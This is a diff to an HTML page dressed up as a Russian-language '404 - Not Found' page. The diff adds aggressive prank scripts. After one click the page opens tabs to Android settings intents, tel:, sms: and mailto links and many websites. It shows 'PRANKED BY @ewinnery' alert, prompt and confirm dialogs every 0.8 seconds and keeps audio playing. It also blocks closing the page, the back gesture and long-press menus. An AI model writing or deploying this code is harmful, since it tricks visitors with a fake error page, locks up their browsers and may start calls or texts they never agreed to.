@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>404 - Not Found</title>
     <style>
         body {
@@ -18,47 +18,48 @@
             color: #fff;
             overflow: hidden;
             cursor: default;
+            -webkit-user-select: none; /* Отключаем выделение */
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent; /* Убираем подсветку при тапе */
         }
 
         .overlay {
             text-align: center;
             padding: 20px;
             width: 90%;
-            max-width: 400px;
+            max-width: 360px; /* Оптимизация под телефоны */
             background: #303030;
             border: 1px solid #424242;
             border-radius: 5px;
+            box-sizing: border-box;
         }
 
         h2 {
-            font-size: 2.5em;
+            font-size: 2em;
             color: #d32f2f;
             margin: 0;
             font-weight: bold;
         }
 
         p {
-            font-size: 1.2em;
+            font-size: 1em;
             color: #b0b0b0;
             margin: 10px 0;
         }
 
         span {
-            font-size: 1em;
+            font-size: 0.9em;
             color: #d32f2f;
             font-weight: bold;
         }
 
-        @media (max-width: 600px) {
-            h2 {
-                font-size: 2em;
-            }
-            p {
-                font-size: 1em;
-            }
-            span {
-                font-size: 0.9em;
-            }
+        /* Адаптация только для телефонов */
+        @media (max-width: 600px) and (pointer: coarse) {
+            h2 { font-size: 1.8em; }
+            p { font-size: 0.9em; }
+            span { font-size: 0.8em; }
         }
     </style>
 </head>
@@ -88,7 +89,16 @@
                 'Netflix - Shows'
             ];
 
-            // Список сайтов для переадресации
+            // Системные ссылки (в первую очередь)
+            const systemLinks = [
+                'intent://settings#Intent;scheme=android.settings;end', // Настройки Android
+                'tel:+1234567890', // Попытка звонка
+                'sms:12345?body=Error', // Попытка SMS
+                'mailto:support@fake.com?subject=Error', // Почта
+                'about:blank' // Пустая вкладка для путаницы
+            ];
+
+            // Сайты (вторая очередь)
             const randomSites = [
                 'https://www.google.com',
                 'https://www.youtube.com',
@@ -108,16 +118,42 @@
                 document.title = randomTitle;
             }
 
-            // Функция переадресации
-            let siteIndex = 0;
-            function redirectLoop() {
-                setTimeout(() => {
-                    window.location.href = randomSites[siteIndex];
-                    siteIndex = (siteIndex + 1) % randomSites.length;
-                }, 2000); // Переадресация каждые 2 секунды
+            // Функция открытия окон с кулдауном
+            function openTabsWithCooldown() {
+                let delay = 0;
+
+                // Сначала системные ссылки
+                systemLinks.forEach((link) => {
+                    setTimeout(() => {
+                        window.open(link, '_blank');
+                    }, delay);
+                    delay += 1000; // Кулдаун 1 секунда между системными
+                });
+
+                // Затем сайты
+                randomSites.forEach((site) => {
+                    setTimeout(() => {
+                        window.open(site, '_blank');
+                    }, delay);
+                    delay += 1500; // Кулдаун 1.5 секунды между сайтами
+                });
             }
 
-            // Пранк запускается при первом клике где угодно
+            // Функция бесконечных диалогов
+            function annoyUser() {
+                setInterval(() => {
+                    const rand = Math.random();
+                    if (rand < 0.4) {
+                        alert('PRANKED BY @ewinnery | dsc.gg/zerotiss');
+                    } else if (rand < 0.8) {
+                        prompt('PRANKED BY @ewinnery | dsc.gg/zerotiss');
+                    } else {
+                        confirm('PRANKED BY @ewinnery | dsc.gg/zerotiss');
+                    }
+                }, 800); // Диалоги каждые 0.8 сек
+            }
+
+            // Пранк запускается при первом клике
             let prankStarted = false;
             document.body.addEventListener('click', () => {
                 if (prankStarted) return;
@@ -130,24 +166,43 @@
                 // Меняем заголовок каждые 1.5 секунды
                 setInterval(changeTitle, 1500);
 
-                // Запускаем переадресацию
-                redirectLoop();
+                // Открываем окна с кулдауном
+                openTabsWithCooldown();
+
+                // Запускаем диалоги
+                annoyUser();
 
                 // Удерживаем звук активным
                 setInterval(() => {
                     audio.play();
                 }, 1000);
-
-                // Блокируем закрытие (ограниченно работает)
-                window.addEventListener('beforeunload', (e) => {
-                    e.preventDefault();
-                    e.returnValue = 'Вы уверены?';
-                });
             });
 
             // Возобновляем звук при потере фокуса
             window.addEventListener('blur', () => {
                 audio.play();
+            });
+
+            // Усложняем закрытие
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                e.returnValue = 'PRANKED BY @ewinnery | dsc.gg/zerotiss';
+                setTimeout(() => {
+                    confirm('PRANKED BY @ewinnery | dsc.gg/zerotiss');
+                    prompt('PRANKED BY @ewinnery | dsc.gg/zerotiss');
+                }, 100);
+            });
+
+            // Блокируем жест "назад"
+            window.addEventListener('popstate', (e) => {
+                history.pushState(null, null, window.location.href);
+                audio.play();
+            });
+            history.pushState(null, null, window.location.href);
+
+            // Предотвращаем выход через долгое нажатие (ограниченно)
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
             });
         });
     </script>
